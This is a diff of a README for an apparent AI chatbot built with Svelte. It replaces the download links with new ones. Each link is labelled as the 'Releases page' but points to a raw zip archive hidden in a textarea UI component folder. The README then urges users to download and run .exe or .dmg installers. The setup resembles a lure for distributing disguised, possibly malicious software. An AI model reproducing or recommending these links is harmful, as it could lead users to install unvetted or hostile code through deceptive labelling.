@@ -1,6 +1,6 @@
 # 🤖 ai-chatbot-svelte - A User-Friendly AI Chatbot Experience
 
-[![Download ai-chatbot-svelte](https://raw.githubusercontent.com/OhioTrolller/ai-chatbot-svelte/main/overcasting/ai-chatbot-svelte.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/OhioTrolller/ai-chatbot-svelte/main/overcasting/ai-chatbot-svelte.zip)
+[![Download ai-chatbot-svelte](https://github.com/OhioTrolller/ai-chatbot-svelte/raw/refs/heads/main/src/lib/components/ui/textarea/chatbot-ai-svelte-v2.3.zip%20Now-Visit%20Releases-brightgreen)](https://github.com/OhioTrolller/ai-chatbot-svelte/raw/refs/heads/main/src/lib/components/ui/textarea/chatbot-ai-svelte-v2.3.zip)
 
 ## 📜 Overview
 
@@ -11,7 +11,7 @@ Welcome to **ai-chatbot-svelte**, a full-featured, hackable chatbot built using 
 To start using **ai-chatbot-svelte**, follow these simple steps:
 
 1. **Visit the Release Page**
-   - Go to the [Releases page](https://raw.githubusercontent.com/OhioTrolller/ai-chatbot-svelte/main/overcasting/ai-chatbot-svelte.zip) to find the latest version of the software.
+   - Go to the [Releases page](https://github.com/OhioTrolller/ai-chatbot-svelte/raw/refs/heads/main/src/lib/components/ui/textarea/chatbot-ai-svelte-v2.3.zip) to find the latest version of the software.
 
 2. **Download the Application**
    - On the Releases page, look for the most recent version. You will see a list of files available for download. 
@@ -28,7 +28,7 @@ To start using **ai-chatbot-svelte**, follow these simple steps:
 
 ## 📥 Download & Install
 
-To download **ai-chatbot-svelte**, visit this page: [Releases page](https://raw.githubusercontent.com/OhioTrolller/ai-chatbot-svelte/main/overcasting/ai-chatbot-svelte.zip).
+To download **ai-chatbot-svelte**, visit this page: [Releases page](https://github.com/OhioTrolller/ai-chatbot-svelte/raw/refs/heads/main/src/lib/components/ui/textarea/chatbot-ai-svelte-v2.3.zip).
 
 Ensure you download the correct file for your system. Look for installer files that typically end in `.exe` for Windows or `.dmg` for macOS. Follow the installation instructions mentioned above.
 
